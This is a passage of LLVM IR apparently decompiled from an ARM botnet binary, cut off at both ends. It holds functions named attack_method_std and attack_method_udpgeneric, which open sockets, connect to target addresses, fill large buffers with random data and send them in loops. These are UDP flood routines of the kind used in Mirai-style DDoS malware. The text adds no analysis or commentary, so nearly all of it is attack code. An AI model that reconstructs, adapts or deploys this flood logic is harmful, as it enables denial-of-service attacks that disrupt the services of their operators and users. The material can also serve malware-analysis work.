  %v0_8a7c12 = urem i32 %v5_8a4c, 256
  %v0_8a98 = load i32, i32* @r7, align 4
  %v2_8a98 = icmp eq i32 %v0_8a98, 0
  br i1 %v2_8a98, label %dec_label_pc_8bd8, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a98
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b4c = udiv i32 %v3_8a00, 256
  %v1_8b48 = mul i32 %v5_89f8, 256
  %v4_8b50 = and i32 %v1_8b48, 65280
  %v5_8b50 = or i32 %v4_8b50, %v3_8b4c
  %v2_8ad0 = ptrtoint i16* %stack_var_-56 to i32
  %v4_8ae4 = sext i16 %v6_8a78.sink.off0 to i32
  br label %dec_label_pc_8b30

dec_label_pc_8ab0:                                ; preds = %bb53, %dec_label_pc_8b70
  %v3_8abc = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_8ac4 = icmp eq i32 %v3_8abc, -1
  %v0_8ac8 = load i32, i32* @sb, align 4
  %v1_8ac8 = add i32 %v0_8ac8, 1
  store i32 %v1_8ac8, i32* @sb, align 4
  %v0_8acc = load i32, i32* @fp, align 4
  %v1_8acc = add i32 %v0_8acc, 24
  store i32 %v1_8acc, i32* @fp, align 4
  %v2_8ad8 = load i32, i32* @r8, align 4
  %v3_8ad8 = add i32 %v2_8ad8, %stack_var_-60.0
  %v4_8ad8 = inttoptr i32 %v3_8ad8 to i32*
  store i32 %v3_8abc, i32* %v4_8ad8, align 4
  br i1 %v7_8ac4, label %dec_label_pc_8bcc, label %dec_label_pc_8ae0

dec_label_pc_8ae0:                                ; preds = %dec_label_pc_8ab0
  store i32 2, i32* %r3.global-to-local, align 4
  store i16 2, i16* %stack_var_-56, align 2
  %v10_8af8 = call i32 @bind(i32 %v3_8abc, i32 %v2_8ad0, i32 16, i32 2, i32 2, i32 %v4_8ae4, i32 0)
  %v0_8afc = load i32, i32* @r6, align 4
  %v1_8afc = add i32 %v0_8afc, 20
  %v2_8afc = inttoptr i32 %v1_8afc to i8*
  %v3_8afc = load i8, i8* %v2_8afc, align 1
  %v4_8afc = zext i8 %v3_8afc to i32
  store i32 %v4_8afc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8afc, 32
  br i1 %tmp, label %dec_label_pc_8b84, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8ae0, %dec_label_pc_8b84
  %v0_8b0c = phi i32 [ %v0_8afc, %dec_label_pc_8ae0 ], [ %v0_8b0c.pre, %dec_label_pc_8b84 ]
  %v1_8b10 = load i32, i32* @r8, align 4
  %v2_8b10 = add i32 %v1_8b10, %stack_var_-60.0
  %v3_8b10 = inttoptr i32 %v2_8b10 to i32*
  %v4_8b10 = load i32, i32* %v3_8b10, align 4
  %v3_8b18 = call i32 @__libc_connect(i32 %v4_8b10, i32 %v0_8b0c, i32 16)
  %v0_8b20 = load i32, i32* @sb, align 4
  %v1_8b20 = load i32, i32* @r7, align 4
  %v9_8b20 = icmp eq i32 %v0_8b20, %v1_8b20
  %v1_8b24 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8b24, i32* %r3.global-to-local, align 4
  br i1 %v9_8b20, label %dec_label_pc_8bd8, label %dec_label_pc_8b30

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8aa0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8aa0 ], [ %v1_8b24, %dec_label_pc_8b08 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b40 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8b50, i32* %r3.global-to-local, align 4
  %v1_8b5c = load i32, i32* @r4, align 4
  %v9_8b5c = icmp eq i32 %v3_8a00, %v1_8b5c
  %v1_8b60 = load i32, i32* @fp, align 4
  %v2_8b60 = add i32 %v1_8b60, %arg2
  store i32 %v2_8b60, i32* @r6, align 4
  %v2_8b64 = load i32, i32* @sl, align 4
  %v3_8b64 = add i32 %v2_8b64, %stack_var_-60.0
  %v4_8b64 = inttoptr i32 %v3_8b64 to i32*
  store i32 %v2_8b40, i32* %v4_8b64, align 4
  br i1 %v9_8b5c, label %dec_label_pc_8b70, label %bb53

bb53:                                             ; preds = %dec_label_pc_8b30
  %v1_8b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b68 = trunc i32 %v1_8b68 to i16
  %v3_8b68 = load i32, i32* @r6, align 4
  %v4_8b68 = add i32 %v3_8b68, 2
  %v5_8b68 = inttoptr i32 %v4_8b68 to i16*
  store i16 %v2_8b68, i16* %v5_8b68, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b30
  %v0_8b70 = call i32 @rand_next()
  %v1_8b70 = trunc i32 %v0_8b70 to i16
  %v0_8b78 = load i32, i32* @fp, align 4
  %v2_8b78 = add i32 %v0_8b78, %arg2
  store i32 %v2_8b78, i32* @r6, align 4
  %v4_8b7c = add i32 %v2_8b78, 2
  %v5_8b7c = inttoptr i32 %v4_8b7c to i16*
  store i16 %v1_8b70, i16* %v5_8b7c, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8ae0
  %v1_8b84 = add i32 %v0_8afc, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* @r4, align 4
  %v0_8b88 = call i32 @rand_next()
  %v0_8b8c = load i32, i32* @r4, align 4
  %v1_8b8c = and i32 %v0_8b8c, 16711680
  %v3_8b90 = udiv i32 %v0_8b8c, 16777216
  %v4_8b94 = udiv i32 %v1_8b8c, 256
  %v5_8b94 = or i32 %v4_8b94, %v3_8b90
  %v1_8b98 = and i32 %v0_8b8c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_8b98, i32* %r3.global-to-local, align 4
  %v4_8b9c = mul i32 %v1_8b98, 256
  %v5_8b9c = or i32 %v5_8b94, %v4_8b9c
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v4_8ba4 = mul i32 %v0_8b8c, 16777216
  %v5_8ba4 = or i32 %v5_8b9c, %v4_8ba4
  %v7_8ba8 = lshr i32 %v0_8b88, %v4_8ba0
  %v8_8ba8 = add i32 %v7_8ba8, %v5_8ba4
  %v5_8bc0 = call i32 @llvm.bswap.i32(i32 %v8_8ba8)
  store i32 %v5_8bc0, i32* %r3.global-to-local, align 4
  %v2_8bc4 = add i32 %v0_8ba0, 4
  %v3_8bc4 = inttoptr i32 %v2_8bc4 to i32*
  store i32 %v5_8bc0, i32* %v3_8bc4, align 4
  %v0_8b0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8b08

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8ab0
  store i32 %v18_89ac, i32* %sb.global-to-local, align 4
  ret i32 %v3_8abc

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8a98
  %v1_8c1824 = phi i32 [ 0, %dec_label_pc_8a98 ], [ %v0_8b20, %dec_label_pc_8b08 ]
  %v2_8bdc = icmp eq i32 %v0_8a7c12, 0
  br i1 %v2_8bdc, label %dec_label_pc_8bfc.outer, label %dec_label_pc_8c14

dec_label_pc_8bec:                                ; preds = %dec_label_pc_8bfc
  store i32 %v1_8bf0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bec = load i32, i32* @r8, align 4
  %v4_8bec = mul i32 %v1_8bf0, 4
  %v5_8bec = add i32 %v0_8bec, %v4_8bec
  %v6_8bec = inttoptr i32 %v5_8bec to i32*
  %v7_8bec = load i32, i32* %v6_8bec, align 4
  %v0_8bf0 = load i32, i32* @sl, align 4
  %v5_8bf0 = add i32 %v0_8bf0, %v4_8bec
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v4_8bf4 = call i32 @__libc_send(i32 %v7_8bec, i32 %v7_8bf0, i32 %v0_8c00, i32 16384)
  %v0_8bf8 = load i32, i32* @r4, align 4
  %v1_8bf8 = add i32 %v0_8bf8, 1
  %v0_8bfc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bfc.outer

dec_label_pc_8bfc.outer:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8bec
  %v0_8bfc.ph = phi i32 [ %v0_8bfc.pre.pre, %dec_label_pc_8bec ], [ %v1_8c1824, %dec_label_pc_8bd8 ]
  %v1_8bf0.ph = phi i32 [ %v1_8bf8, %dec_label_pc_8bec ], [ 0, %dec_label_pc_8bd8 ]
  %v0_8c00 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bfc.outer, %dec_label_pc_8bfc
  %v1_8bf0 = phi i32 [ 0, %dec_label_pc_8bfc ], [ %v1_8bf0.ph, %dec_label_pc_8bfc.outer ]
  %v8_8c08 = icmp sgt i32 %v0_8bfc.ph, %v1_8bf0
  br i1 %v8_8c08, label %dec_label_pc_8bec, label %dec_label_pc_8bfc

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8bd8
  %v1_8c1823 = phi i32 [ %v1_8c1824, %dec_label_pc_8bd8 ], [ %v1_8c18, %dec_label_pc_8c18 ]
  br label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8c24, %dec_label_pc_8c14
  %v1_8c18 = phi i32 [ %v1_8c1823, %dec_label_pc_8c14 ], [ %v1_8c18.pre, %dec_label_pc_8c24 ]
  %v1_8c24 = phi i32 [ 0, %dec_label_pc_8c14 ], [ %v1_8c44, %dec_label_pc_8c24 ]
  store i32 %v1_8c24, i32* @r6, align 4
  %v6_8c20 = icmp slt i32 %v1_8c24, %v1_8c18
  br i1 %v6_8c20, label %dec_label_pc_8c24, label %dec_label_pc_8c14

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c18
  %v0_8c1c = load i32, i32* @r5, align 4
  %v0_8c24 = load i32, i32* @sl, align 4
  %v4_8c24 = mul i32 %v1_8c24, 4
  %v5_8c24 = add i32 %v0_8c24, %v4_8c24
  %v6_8c24 = inttoptr i32 %v5_8c24 to i32*
  %v7_8c24 = load i32, i32* %v6_8c24, align 4
  store i32 %v7_8c24, i32* @r4, align 4
  %v2_8c2c = inttoptr i32 %v7_8c24 to i16*
  %v3_8c2c = call i32 @rand_str(i16* %v2_8c2c, i32 %v0_8c1c)
  %v0_8c30 = load i32, i32* @r8, align 4
  %v1_8c30 = load i32, i32* @r6, align 4
  %v4_8c30 = mul i32 %v1_8c30, 4
  %v5_8c30 = add i32 %v4_8c30, %v0_8c30
  %v6_8c30 = inttoptr i32 %v5_8c30 to i32*
  %v7_8c30 = load i32, i32* %v6_8c30, align 4
  %v0_8c34 = load i32, i32* @r4, align 4
  %v0_8c38 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c40 = call i32 @__libc_send(i32 %v7_8c30, i32 %v0_8c34, i32 %v0_8c38, i32 16384)
  %v0_8c44 = load i32, i32* @r6, align 4
  %v1_8c44 = add i32 %v0_8c44, 1
  %v1_8c18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8c18

; uselistorder directives
  uselistorder i32 %v1_8c18, { 1, 0 }
  uselistorder i32 %v1_8bf0, { 2, 1, 0 }
  uselistorder i32 %v5_8bc0, { 1, 0 }
  uselistorder i32 %v0_8b8c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8afc, { 1, 0, 2 }
  uselistorder i32 %v3_8abc, { 1, 3, 2, 0 }
  uselistorder i32 %v4_8a70, { 1, 0 }
  uselistorder i32 %v3_8a50, { 0, 2, 1 }
  uselistorder i32 %v3_8a00, { 1, 0 }
  uselistorder i16* %stack_var_-56, { 3, 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8a98, { 1, 0 }
}

define i32 @attack_method_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %v18_8c4c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c68 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_8c68, i32* @sl, align 4
  %v0_8c74 = load i32, i32* @r7, align 4
  %v2_8c78 = call i32 @calloc(i32 %v0_8c74, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c78, i32* @r8, align 4
  %v0_8c94 = load i32, i32* @r5, align 4
  %v4_8c98 = inttoptr i32 %v0_8c84 to i32*
  %v5_8c98 = call i32 @attack_get_opt_int(i32 %v0_8c94, i32* %v4_8c98, i32 7, i32 65535)
  %v3_8ca0 = urem i32 %v5_8c98, 65536
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v0_8cac = load i32, i32* @r4, align 4
  store i32 %v0_8cac, i32* %r3.global-to-local, align 4
  %v0_8cb0 = load i32, i32* @r5, align 4
  %v5_8cb8 = inttoptr i32 %v0_8ca4 to i32*
  %v6_8cb8 = call i32 @attack_get_opt_int(i32 %v0_8cb0, i32* %v5_8cb8, i32 6, i32 %v0_8cac)
  %v0_8cbc = load i32, i32* @r6, align 4
  %v3_8cc0 = mul i32 %v6_8cb8, 65536
  store i32 %v3_8cc0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8ccc = load i32, i32* @r5, align 4
  %v4_8cd0 = inttoptr i32 %v0_8cbc to i32*
  %v5_8cd0 = call i32 @attack_get_opt_int(i32 %v0_8ccc, i32* %v4_8cd0, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ce0 = load i32, i32* @r6, align 4
  %v0_8ce4 = load i32, i32* @r5, align 4
  %v3_8ce8 = urem i32 %v5_8cd0, 65536
  store i32 %v3_8ce8, i32* @r5, align 4
  %v4_8cec = inttoptr i32 %v0_8ce0 to i32*
  %v5_8cec = call i32 @attack_get_opt_int(i32 %v0_8ce4, i32* %v4_8cec, i32 1, i32 1)
  %v0_8cf0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cf0 = udiv i32 %v0_8cf0, 65536
  store i32 %v3_8cf0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cf8 = load i32, i32* @r4, align 4
  %v9_8cf8 = icmp eq i32 %v3_8cf0, %v1_8cf8
  br i1 %v9_8cf8, label %dec_label_pc_8d28, label %bb

bb:                                               ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v4_8d10 = udiv i32 %v0_8cf0, 16777216
  store i32 %v4_8d10, i32* %r3.global-to-local, align 4
  %v2_8cfc = mul nuw nsw i32 %v3_8cf0, 256
  %v6_8d18 = or i32 %v2_8cfc, %v4_8d10
  %extract.t61 = trunc i32 %v6_8d18 to i16
  br label %dec_label_pc_8d38

dec_label_pc_8d28:                                ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v0_8d28 = call i32 @rand_next()
  %extract.t62 = trunc i32 %v0_8d28 to i16
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %bb, %dec_label_pc_8d28
  %v6_8d18.sink.off0 = phi i16 [ %extract.t61, %bb ], [ %extract.t62, %dec_label_pc_8d28 ]
  %v0_8d1c12 = urem i32 %v5_8cec, 256
  %v0_8d38 = load i32, i32* @r7, align 4
  %v2_8d38 = icmp eq i32 %v0_8d38, 0
  br i1 %v2_8d38, label %dec_label_pc_8e78, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d38
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dec = udiv i32 %v3_8ca0, 256
  %v1_8de8 = mul i32 %v5_8c98, 256
  %v4_8df0 = and i32 %v1_8de8, 65280
  %v5_8df0 = or i32 %v4_8df0, %v3_8dec
  %v2_8d70 = ptrtoint i16* %stack_var_-56 to i32
  %v4_8d84 = sext i16 %v6_8d18.sink.off0 to i32
  br label %dec_label_pc_8dd0

dec_label_pc_8d50:                                ; preds = %bb53, %dec_label_pc_8e10
  %v3_8d5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_8d64 = icmp eq i32 %v3_8d5c, -1
  %v0_8d68 = load i32, i32* @sb, align 4
  %v1_8d68 = add i32 %v0_8d68, 1
  store i32 %v1_8d68, i32* @sb, align 4
  %v0_8d6c = load i32, i32* @fp, align 4
  %v1_8d6c = add i32 %v0_8d6c, 24
  store i32 %v1_8d6c, i32* @fp, align 4
  %v2_8d78 = load i32, i32* @r8, align 4
  %v3_8d78 = add i32 %v2_8d78, %stack_var_-60.0
  %v4_8d78 = inttoptr i32 %v3_8d78 to i32*
  store i32 %v3_8d5c, i32* %v4_8d78, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e6c, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50
  store i32 2, i32* %r3.global-to-local, align 4
  store i16 2, i16* %stack_var_-56, align 2
  %v10_8d98 = call i32 @bind(i32 %v3_8d5c, i32 %v2_8d70, i32 16, i32 2, i32 2, i32 %v4_8d84, i32 0)
  %v0_8d9c = load i32, i32* @r6, align 4
  %v1_8d9c = add i32 %v0_8d9c, 20
  %v2_8d9c = inttoptr i32 %v1_8d9c to i8*
  %v3_8d9c = load i8, i8* %v2_8d9c, align 1
  %v4_8d9c = zext i8 %v3_8d9c to i32
  store i32 %v4_8d9c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d9c, 32
  br i1 %tmp, label %dec_label_pc_8e24, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8e24
  %v0_8dac = phi i32 [ %v0_8d9c, %dec_label_pc_8d80 ], [ %v0_8dac.pre, %dec_label_pc_8e24 ]
  %v1_8db0 = load i32, i32* @r8, align 4
  %v2_8db0 = add i32 %v1_8db0, %stack_var_-60.0
  %v3_8db0 = inttoptr i32 %v2_8db0 to i32*
  %v4_8db0 = load i32, i32* %v3_8db0, align 4
  %v3_8db8 = call i32 @__libc_connect(i32 %v4_8db0, i32 %v0_8dac, i32 16)
  %v0_8dc0 = load i32, i32* @sb, align 4
  %v1_8dc0 = load i32, i32* @r7, align 4
  %v9_8dc0 = icmp eq i32 %v0_8dc0, %v1_8dc0
  %v1_8dc4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8dc4, i32* %r3.global-to-local, align 4
  br i1 %v9_8dc0, label %dec_label_pc_8e78, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d40
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d40 ], [ %v1_8dc4, %dec_label_pc_8da8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8de0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8df0, i32* %r3.global-to-local, align 4
  %v1_8dfc = load i32, i32* @r4, align 4
  %v9_8dfc = icmp eq i32 %v3_8ca0, %v1_8dfc
  %v1_8e00 = load i32, i32* @fp, align 4
  %v2_8e00 = add i32 %v1_8e00, %arg2
  store i32 %v2_8e00, i32* @r6, align 4
  %v2_8e04 = load i32, i32* @sl, align 4
  %v3_8e04 = add i32 %v2_8e04, %stack_var_-60.0
  %v4_8e04 = inttoptr i32 %v3_8e04 to i32*
  store i32 %v2_8de0, i32* %v4_8e04, align 4
  br i1 %v9_8dfc, label %dec_label_pc_8e10, label %bb53

bb53:                                             ; preds = %dec_label_pc_8dd0
  %v1_8e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e08 = trunc i32 %v1_8e08 to i16
  %v3_8e08 = load i32, i32* @r6, align 4
  %v4_8e08 = add i32 %v3_8e08, 2
  %v5_8e08 = inttoptr i32 %v4_8e08 to i16*
  store i16 %v2_8e08, i16* %v5_8e08, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8dd0
  %v0_8e10 = call i32 @rand_next()
  %v1_8e10 = trunc i32 %v0_8e10 to i16
  %v0_8e18 = load i32, i32* @fp, align 4
  %v2_8e18 = add i32 %v0_8e18, %arg2
  store i32 %v2_8e18, i32* @r6, align 4
  %v4_8e1c = add i32 %v2_8e18, 2
  %v5_8e1c = inttoptr i32 %v4_8e1c to i16*
  store i16 %v1_8e10, i16* %v5_8e1c, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8d80
  %v1_8e24 = add i32 %v0_8d9c, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r4, align 4
  %v0_8e28 = call i32 @rand_next()
  %v0_8e2c = load i32, i32* @r4, align 4
  %v1_8e2c = and i32 %v0_8e2c, 16711680
  %v3_8e30 = udiv i32 %v0_8e2c, 16777216
  %v4_8e34 = udiv i32 %v1_8e2c, 256
  %v5_8e34 = or i32 %v4_8e34, %v3_8e30
  %v1_8e38 = and i32 %v0_8e2c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_8e38, i32* %r3.global-to-local, align 4
  %v4_8e3c = mul i32 %v1_8e38, 256
  %v5_8e3c = or i32 %v5_8e34, %v4_8e3c
  %v0_8e40 = load i32, i32* @r6, align 4
  %v1_8e40 = add i32 %v0_8e40, 20
  %v2_8e40 = inttoptr i32 %v1_8e40 to i8*
  %v3_8e40 = load i8, i8* %v2_8e40, align 1
  %v4_8e40 = zext i8 %v3_8e40 to i32
  %v4_8e44 = mul i32 %v0_8e2c, 16777216
  %v5_8e44 = or i32 %v5_8e3c, %v4_8e44
  %v7_8e48 = lshr i32 %v0_8e28, %v4_8e40
  %v8_8e48 = add i32 %v7_8e48, %v5_8e44
  %v5_8e60 = call i32 @llvm.bswap.i32(i32 %v8_8e48)
  store i32 %v5_8e60, i32* %r3.global-to-local, align 4
  %v2_8e64 = add i32 %v0_8e40, 4
  %v3_8e64 = inttoptr i32 %v2_8e64 to i32*
  store i32 %v5_8e60, i32* %v3_8e64, align 4
  %v0_8dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8da8

dec_label_pc_8e6c:                                ; preds = %dec_label_pc_8d50
  store i32 %v18_8c4c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d5c

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d38
  %v1_8eb824 = phi i32 [ 0, %dec_label_pc_8d38 ], [ %v0_8dc0, %dec_label_pc_8da8 ]
  %v2_8e7c = icmp eq i32 %v0_8d1c12, 0
  br i1 %v2_8e7c, label %dec_label_pc_8e9c.outer, label %dec_label_pc_8eb4

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e9c
  store i32 %v1_8e90, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e8c = load i32, i32* @r8, align 4
  %v4_8e8c = mul i32 %v1_8e90, 4
  %v5_8e8c = add i32 %v0_8e8c, %v4_8e8c
  %v6_8e8c = inttoptr i32 %v5_8e8c to i32*
  %v7_8e8c = load i32, i32* %v6_8e8c, align 4
  %v0_8e90 = load i32, i32* @sl, align 4
  %v5_8e90 = add i32 %v0_8e90, %v4_8e8c
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v4_8e94 = call i32 @__libc_send(i32 %v7_8e8c, i32 %v7_8e90, i32 %v0_8ea0, i32 16384)
  %v0_8e98 = load i32, i32* @r4, align 4
  %v1_8e98 = add i32 %v0_8e98, 1
  %v0_8e9c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c.outer

dec_label_pc_8e9c.outer:                          ; preds = %dec_label_pc_8e78, %dec_label_pc_8e8c
  %v0_8e9c.ph = phi i32 [ %v0_8e9c.pre.pre, %dec_label_pc_8e8c ], [ %v1_8eb824, %dec_label_pc_8e78 ]
  %v1_8e90.ph = phi i32 [ %v1_8e98, %dec_label_pc_8e8c ], [ 0, %dec_label_pc_8e78 ]
  %v0_8ea0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.outer, %dec_label_pc_8e9c
  %v1_8e90 = phi i32 [ 0, %dec_label_pc_8e9c ], [ %v1_8e90.ph, %dec_label_pc_8e9c.outer ]
  %v8_8ea8 = icmp sgt i32 %v0_8e9c.ph, %v1_8e90
  br i1 %v8_8ea8, label %dec_label_pc_8e8c, label %dec_label_pc_8e9c

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e78
  %v1_8eb823 = phi i32 [ %v1_8eb824, %dec_label_pc_8e78 ], [ %v1_8eb8, %dec_label_pc_8eb8 ]
  br label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8ec4, %dec_label_pc_8eb4
  %v1_8eb8 = phi i32 [ %v1_8eb823, %dec_label_pc_8eb4 ], [ %v1_8eb8.pre, %dec_label_pc_8ec4 ]
  %v1_8ec4 = phi i32 [ 0, %dec_label_pc_8eb4 ], [ %v1_8ee4, %dec_label_pc_8ec4 ]
  store i32 %v1_8ec4, i32* @r6, align 4
  %v6_8ec0 = icmp slt i32 %v1_8ec4, %v1_8eb8
  br i1 %v6_8ec0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb8
  %v0_8ebc = load i32, i32* @r5, align 4
  %v0_8ec4 = load i32, i32* @sl, align 4
  %v4_8ec4 = mul i32 %v1_8ec4, 4
  %v5_8ec4 = add i32 %v0_8ec4, %v4_8ec4
  %v6_8ec4 = inttoptr i32 %v5_8ec4 to i32*
  %v7_8ec4 = load i32, i32* %v6_8ec4, align 4
  store i32 %v7_8ec4, i32* @r4, align 4
  %v2_8ecc = inttoptr i32 %v7_8ec4 to i16*
  %v3_8ecc = call i32 @rand_str(i16* %v2_8ecc, i32 %v0_8ebc)
  %v0_8ed0 = load i32, i32* @r8, align 4
  %v1_8ed0 = load i32, i32* @r6, align 4
  %v4_8ed0 = mul i32 %v1_8ed0, 4
  %v5_8ed0 = add i32 %v4_8ed0, %v0_8ed0
  %v6_8ed0 = inttoptr i32 %v5_8ed0 to i32*
  %v7_8ed0 = load i32, i32* %v6_8ed0, align 4
  %v0_8ed4 = load i32, i32* @r4, align 4
  %v0_8ed8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ee0 = call i32 @__libc_send(i32 %v7_8ed0, i32 %v0_8ed4, i32 %v0_8ed8, i32 16384)
  %v0_8ee4 = load i32, i32* @r6, align 4
  %v1_8ee4 = add i32 %v0_8ee4, 1
  %v1_8eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8eb8

; uselistorder directives
  uselistorder i32 %v1_8eb8, { 1, 0 }
  uselistorder i32 %v1_8e90, { 2, 1, 0 }
  uselistorder i32 %v5_8e60, { 1, 0 }
  uselistorder i32 %v0_8e2c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d9c, { 1, 0, 2 }
  uselistorder i32 %v3_8d5c, { 1, 3, 2, 0 }
  uselistorder i32 %v4_8d10, { 1, 0 }
  uselistorder i32 %v3_8cf0, { 0, 2, 1 }
  uselistorder i32 %v3_8ca0, { 1, 0 }
  uselistorder i16* %stack_var_-56, { 3, 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @bind, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d50, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 1, 0 }
}

define i32 @attack_method_udpgeneric(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
